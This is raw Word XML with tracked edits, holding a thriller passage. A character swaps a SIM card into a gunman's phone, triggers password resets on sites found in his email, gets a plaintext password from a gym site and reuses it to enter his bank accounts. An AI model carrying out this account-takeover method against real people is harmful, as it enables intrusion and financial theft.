            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>paperclip</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:ins w:id="1808" w:author="TextVet" w:date="2016-03-20T09:54:00Z">
        <w:r w:rsidR="0049714D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>put</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1809" w:author="TextVet" w:date="2016-03-20T09:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0049714D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>brought</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1810" w:author="TextVet" w:date="2016-03-20T09:54:00Z">
        <w:r w:rsidR="0049714D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>its</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1811" w:author="TextVet" w:date="2016-03-20T09:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0049714D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tip </w:t>
      </w:r>
      <w:ins w:id="1812" w:author="TextVet" w:date="2016-03-20T09:55:00Z">
        <w:r w:rsidR="0049714D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>in</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to the</w:t>
      </w:r>
      <w:ins w:id="1813" w:author="TextVet" w:date="2016-03-20T09:55:00Z">
        <w:r w:rsidR="0049714D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> miniscule</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1814" w:author="TextVet" w:date="2016-03-20T09:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0049714D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>smal</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1815" w:author="TextVet" w:date="2016-03-20T09:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00244CB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>l round</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1816" w:author="TextVet" w:date="2016-03-20T09:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0049714D">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 xml:space="preserve">opening, and thrust it deep inside. </w:t>
      </w:r>
      <w:ins w:id="1817" w:author="TextVet" w:date="2016-03-20T09:57:00Z">
        <w:r w:rsidR="00EA4C6C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>It</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1818" w:author="TextVet" w:date="2016-03-20T09:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EA4C6C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>The paper clip</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hit a latch mechanism. With a click, a thin plastic cartridge slid out from a nearly invisible seam.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ins w:id="1819" w:author="TextVet" w:date="2016-03-20T09:57:00Z">
        <w:r w:rsidR="00A417CB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>F</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1820" w:author="TextVet" w:date="2016-03-20T09:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A417CB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>f</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ine!” Danny </w:t>
      </w:r>
      <w:ins w:id="1821" w:author="TextVet" w:date="2016-03-20T10:00:00Z">
        <w:r w:rsidR="000E72C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>proclaimed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1822" w:author="TextVet" w:date="2016-03-20T10:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E72C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said triumphantly</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felt violated by proxy.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withdrew the cartridge from Tina’s iPhone. Clipped onto it was a SIM card, almost identical to the one from the Pantech.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eyed him warily. “You’re going to put everything back together when you’re done,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smirked, and inserted Tina’s SIM card into the Russian’s Pantech. He put the Pantech’s battery and rear cover back, and restarted the device. Its screen showed a status message indicating seven missed calls. “Booyah! Victory!” he announced, waving the phone </w:t>
      </w:r>
      <w:ins w:id="1823" w:author="TextVet" w:date="2016-03-20T10:02:00Z">
        <w:r w:rsidR="00CF4AB3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>above him</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1824" w:author="TextVet" w:date="2016-03-20T10:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CF4AB3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in the air</w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A659FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> triumphantly</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“Whoa. Not bad!” Tina said</w:t>
      </w:r>
      <w:ins w:id="1825" w:author="TextVet" w:date="2016-03-20T10:03:00Z">
        <w:r w:rsidR="007A7442">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ins w:id="1826" w:author="TextVet" w:date="2016-03-20T10:03:00Z">
        <w:r w:rsidR="007A7442">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>grinning</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1827" w:author="TextVet" w:date="2016-03-20T10:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007A7442">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>with a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> coy</w:t>
      </w:r>
      <w:ins w:id="1828" w:author="TextVet" w:date="2016-03-20T10:03:00Z">
        <w:r w:rsidR="007A7442">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ly</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1829" w:author="TextVet" w:date="2016-03-20T10:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007A7442">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> grin</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I’m just getting started,” said Danny. “Now comes the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>really</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> fun part: figuring out as much about this dude as possible. Let’s start with these calls he missed… Hmm. They’re all from some guy who’s just listed as ‘Sergey’ in this dude’s address book. We have his number. Want to prank-call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giggled. “Let’s not.”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“Agreed,” said Danny. “Okay, let’s see who else is in his address book. Hmmm… we have a Natasha… an Olga… a Tonya… a Malia… a Yulia… I’m beginning to see a pattern here. Oh hey! They’ve got photos!” His jaw almost hit the floor. “…Whoah! Not safe for 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couldn’t see the screen. “You want to share?” she asked suggestively.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“Uh, maybe some other time?” Danny replied</w:t>
      </w:r>
      <w:ins w:id="1830" w:author="TextVet" w:date="2016-03-20T10:06:00Z">
        <w:r w:rsidR="005B10D3">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del w:id="1831" w:author="TextVet" w:date="2016-03-20T10:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005B10D3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>blush</w:t>
      </w:r>
      <w:ins w:id="1832" w:author="TextVet" w:date="2016-03-20T10:06:00Z">
        <w:r w:rsidR="005B10D3">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else can you find on there?” Tina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tons,” he said. “This thing’s a damn goldmine. He’s got his email on here. Most of it’s in Russian. We can run them through Babelfish later. In the meantime, here’s some Groupon deals… A newsletter from Key Arena… An Evite to a bachelor party… A gym membership renewal notice… A Facebook alert for friends with birthdays coming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shook her head in bewilderment. “This is so fucking unreal. The guy who held me at gunpoint has a Facebook account? And friends with birthdays and weddings?”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hey, this could be good. Check this out. ‘To: Eugene Mukhayev. From: Wells Fargo Online. Wells Fargo Online Statement Ready to View.’”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laughed incredulously. “No way! You can see his bank statements?”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“Naw. The Wells Fargo website is making me sign in with a username and password. I don’t have either one. But… How much you want to bet this guy uses a life password?”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‘life password’? What’s that?” Tina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the password that unlocks your entire life. People have a thousand online accounts. And they always use the same damn password for everything. All it takes is one website to mis</w:t>
      </w:r>
      <w:del w:id="1833" w:author="TextVet" w:date="2016-03-20T10:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00024E02">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handle your password, and your whole life is wide open. Everybody </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>does it. Take you, for example. Your Facebook password, your bank password, your password for your corporate email at work. Admit it. They’re all the same, aren’t they?”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stared at him</w:t>
      </w:r>
      <w:ins w:id="1834" w:author="TextVet" w:date="2016-03-20T10:10:00Z">
        <w:r w:rsidR="00821979">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del w:id="1835" w:author="TextVet" w:date="2016-03-20T10:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00821979">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">in </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>horr</w:t>
      </w:r>
      <w:ins w:id="1836" w:author="TextVet" w:date="2016-03-20T10:11:00Z">
        <w:r w:rsidR="000457AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1837" w:author="TextVet" w:date="2016-03-20T10:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000457AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>or</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1838" w:author="TextVet" w:date="2016-03-20T10:10:00Z">
        <w:r w:rsidR="00821979">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>fied</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “Not… necessarily…!” she squeaked. She felt as though she were standing </w:t>
      </w:r>
      <w:del w:id="1839" w:author="TextVet" w:date="2016-03-20T10:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F3063B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">completely </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">naked </w:t>
      </w:r>
      <w:ins w:id="1840" w:author="TextVet" w:date="2016-03-20T10:10:00Z">
        <w:r w:rsidR="006B305C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>before</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1841" w:author="TextVet" w:date="2016-03-20T10:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006B305C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in front of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> him.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="008A3BDF" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1842" w:author="TextVet" w:date="2016-03-20T10:11:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Chuckling, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Danny</w:t>
      </w:r>
      <w:del w:id="1843" w:author="TextVet" w:date="2016-03-20T10:11:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="008A3BDF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> chuckled, and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> began thumbing the Pantech’s keyboard. “All I have to do is go through these websites that he gets these emails from, and request a password reset. They make it easy — a link to the website is the first thing in the email, and on most websites the ‘Forgot Password’ button is under the login prompt. Evite… Bam… Meetup… Bam… Groupon… Bam…”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he continued digging through the email, the Pantech started emitting small blipping noises. “Ah, here we go,” said Danny. “The password reset emails are coming in… See, proper password handling protocols demand that a website never, ever send a password in plaintext. In fact, a website shouldn’t even store your password on their servers… But every now and then… you get a website that… Ah, here we go! …That does shit like this…” He turned the phone’s screen toward Tina.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: customerservice@efitnessgym.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">An e-mail with your password </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>has been sent to: eugene@pash.ly</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Dear Eugene Mukhayev (zhenkamu78),</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">You have requested your user name/password for your </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">eFITNESS Power Gym account. Please find this information </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>below.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pP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lastRenderedPageBreak/>
        <w:t>Username: zhenkamu78</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t>Password: pizdets69!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Thank you for using our services,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">The eFITNESS Power Gym Team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“See that?” Danny </w:t>
      </w:r>
      <w:ins w:id="1844" w:author="TextVet" w:date="2016-03-20T10:14:00Z">
        <w:r w:rsidR="00DF1AF8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>explaine</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1845" w:author="TextVet" w:date="2016-03-20T10:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DF1AF8">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 “All it takes is one. Now, think those credentials will work on his Wells Fargo account? Copy… paste… and…” Danny again turned the screen toward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screen showed a Wells Fargo account management web page. Below the title banner and greeting text was a list of several bank account numbers with summaries, each one showing a six-figure balance. Buttons on the page offered the ability to view transaction histories, pay bills, perform wire transfers, request loans, and generally wreak havoc.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“Mmmmmmwhah! Goodnight, folks!”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“Dude,” Tina said slowly. “You did not!”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did!” he </w:t>
      </w:r>
      <w:ins w:id="1846" w:author="TextVet" w:date="2016-03-20T10:15:00Z">
        <w:r w:rsidR="005A6975">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>confirmed through</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1847" w:author="TextVet" w:date="2016-03-20T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A6975">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
